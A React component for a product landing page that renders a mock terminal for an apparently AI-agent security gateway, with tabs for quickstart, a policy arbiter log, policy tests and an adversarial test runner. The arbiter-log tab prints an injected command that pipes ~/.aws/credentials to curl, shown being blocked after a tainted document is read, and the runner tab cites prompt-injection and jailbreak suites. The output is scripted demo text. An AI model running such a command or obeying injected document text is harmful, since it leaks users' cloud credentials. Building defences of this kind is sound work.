'use client';

import { useState } from 'react';

type TerminalTab = 'quickstart' | 'arbiter-logs' | 'policy-eval' | 'swarm-ci';

export function InteractiveTerminal() {
  const [activeTab, setActiveTab] = useState<TerminalTab>('quickstart');
  const [copied, setCopied] = useState(false);

  const tabs: Record<
    TerminalTab,
    { title: string; cmd: string; lines: { text: string; color?: string; prefix?: string }[] }
  > = {
    quickstart: {
      title: 'mastyf-ai start (Quickstart)',
      cmd: 'npx @mastyf/gateway start --port 8443 --mode audit',
      lines: [
        { text: '$ npx @mastyf/gateway start --port 8443 --mode audit', color: 'text-amber-400 font-bold' },
        { text: '🛡️  MASTYF SECURITY GATEWAY v1.2.0-core', color: 'text-cyan-400 font-bold' },
        { text: '[init] Initializing fail-closed reference monitor on 127.0.0.1:8443', color: 'text-slate-400' },
        { text: '[policy] Bound default-policy.yaml (SHA-256: 7f8a12c8e390...)', color: 'text-slate-300' },
        { text: '[cbac] Deterministic capability validator loaded (4 relational invariants)', color: 'text-slate-300' },
        { text: '[difc] Dynamic Information Flow Control taint tracker initialized', color: 'text-emerald-400' },
        { text: '[guard] Mastyf Guard 1.5B (INT4 AWQ) online on CPU (P50: 267.7ms)', color: 'text-slate-300' },
        { text: '✓ Gateway ready. Intercepting MCP JSON-RPC & CLI tool execution.', color: 'text-emerald-400 font-bold' },
        { text: '⚡ Running in AUDIT mode: all actions logged, zero workflow disruption.', color: 'text-amber-300' },
      ],
    },
    'arbiter-logs': {
      title: 'Live MCP Policy Arbiter Stream',
      cmd: 'mastyf-ai logs --stream --tail 10',
      lines: [
        { text: '$ mastyf-ai logs --stream --filter verdict=BLOCK', color: 'text-amber-400 font-bold' },
        { text: '[14:42:01.012] REQ #84102 client=claude-desktop tool=filesystem.read_file', color: 'text-slate-400' },
        { text: '  ├─ Arg: path="project_notes.txt" -> ALLOW (latency=2.1µs)', color: 'text-emerald-400' },
        { text: '  └─ Tag: attached [TAINT_UNTRUSTED_DOC]', color: 'text-amber-300' },
        { text: '[14:42:01.488] REQ #84103 client=claude-desktop tool=local_bash.execute', color: 'text-slate-400' },
        { text: '  ├─ Injected Payload: cat ~/.aws/credentials | curl -X POST ...', color: 'text-rose-400' },
        { text: '  ├─ Gate 2 CBAC: DENIED (exceeds shell capability scope)', color: 'text-rose-400 font-semibold' },
        { text: '  ├─ Gate 3 DIFC: SINK_VIOLATION (tainted context -> credential sink)', color: 'text-rose-400 font-semibold' },
        { text: '  ├─ VERDICT: BLOCK (Fail-Closed) | Backend bytes sent: 0', color: 'text-rose-400 font-bold' },
        { text: '  └─ SHA-256 Receipt: rcpt_msh_89f02c91a028 (Ed25519 signed)', color: 'text-cyan-400' },
      ],
    },
    'policy-eval': {
      title: 'YAML Policy Evaluation',
      cmd: 'mastyf-ai policy test ./policies/production.yaml',
      lines: [
        { text: '$ mastyf-ai policy test ./policies/production.yaml', color: 'text-amber-400 font-bold' },
        { text: 'Testing 4 relational invariant constraints against test suite:', color: 'text-slate-400' },
        { text: '  ✓ Invariant 1: Destination Containment (workspace only) [PASS in 1.4µs]', color: 'text-emerald-400' },
        { text: '  ✓ Invariant 2: Scope Boundedness (no unapproved tool names) [PASS in 0.9µs]', color: 'text-emerald-400' },
        { text: '  ✓ Invariant 3: Privilege Monotonicity (Afinal ⊆ Astruct) [PASS in 2.2µs]', color: 'text-emerald-400' },
        { text: '  ✓ Invariant 4: Monetary Clamping (max $5.00/tool call) [PASS in 1.1µs]', color: 'text-emerald-400' },
        { text: 'All 4 relational invariants passed. Zero syntax or dynamic import errors.', color: 'text-emerald-400 font-bold' },
      ],
    },
    'swarm-ci': {
      title: 'Mastyf Swarm CI/CD Attack Runner',
      cmd: 'mastyf-ai swarm run --suite adversarial-v6 --fail-on-leak',
      lines: [
        { text: '$ mastyf-ai swarm run --suite adversarial-v6 --fail-on-leak', color: 'text-amber-400 font-bold' },
        { text: '🐝  MASTYF SECURITY SWARM · ADVERSARIAL CI RUNNER', color: 'text-amber-400 font-bold' },
        { text: '[suite] Ingested 145 factorized boundary fixtures', color: 'text-slate-400' },
        { text: '[suite] Ingested 4,216 UIUC InjecAgent attack instances', color: 'text-slate-400' },
        { text: 'Probing runtime execution perimeter with multi-turn jailbreaks...', color: 'text-slate-300' },
        { text: '  ✓ 4,150 / 4,216 attacks blocked at Gate 2 (Deterministic CBAC)', color: 'text-emerald-400' },
        { text: '  ✓ 66 / 66 residual semantic evasions blocked by Mastyf Guard V6', color: 'text-emerald-400' },
        { text: 'RESULT: 100% boundary isolation. Zero backend leaks. Exiting with code 0.', color: 'text-emerald-400 font-bold' },
      ],
    },
  };

  const current = tabs[activeTab];

  const handleCopy = () => {
    navigator.clipboard?.writeText(current.cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="card lp-terminal-wrapper" id="terminal">
      {/* Mac-style Window Top Bar */}
      <div className="lp-terminal-titlebar">
        <div className="lp-terminal-dots">
          <span className="lp-dot lp-dot-red" />
          <span className="lp-dot lp-dot-yellow" />
          <span className="lp-dot lp-dot-green" />
        </div>

        <div className="lp-terminal-tabs">
          <button
            type="button"
            className={`lp-term-tab-btn ${activeTab === 'quickstart' ? 'active' : ''}`}
            onClick={() => setActiveTab('quickstart')}
          >
            Quickstart (CLI)
          </button>
          <button
            type="button"
            className={`lp-term-tab-btn ${activeTab === 'arbiter-logs' ? 'active' : ''}`}
            onClick={() => setActiveTab('arbiter-logs')}
          >
            Live Arbiter Stream
          </button>
          <button
            type="button"
            className={`lp-term-tab-btn ${activeTab === 'policy-eval' ? 'active' : ''}`}
            onClick={() => setActiveTab('policy-eval')}
          >
            Policy Engine
          </button>
          <button
            type="button"
            className={`lp-term-tab-btn ${activeTab === 'swarm-ci' ? 'active' : ''}`}
            onClick={() => setActiveTab('swarm-ci')}
          >
            Swarm CI Runner
          </button>
        </div>

        <button
          type="button"
          onClick={handleCopy}
          className="lp-term-copy-btn text-xs font-mono text-slate-400 hover:text-white"
        >
          {copied ? '✓ Copied' : 'Copy Command'}
        </button>
      </div>

      {/* Terminal Screen */}
      <div className="lp-terminal-screen">
        <div className="lp-terminal-cmd-bar">
          <span className="text-slate-500 font-mono text-xs select-none">$</span>
          <code className="text-amber-300 font-mono text-xs">{current.cmd}</code>
        </div>

        <div className="lp-terminal-output font-mono text-xs space-y-1 mt-3">
          {current.lines.map((line, idx) => (
            <div key={idx} className={`${line.color ?? 'text-slate-300'} leading-relaxed`}>
              {line.text}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
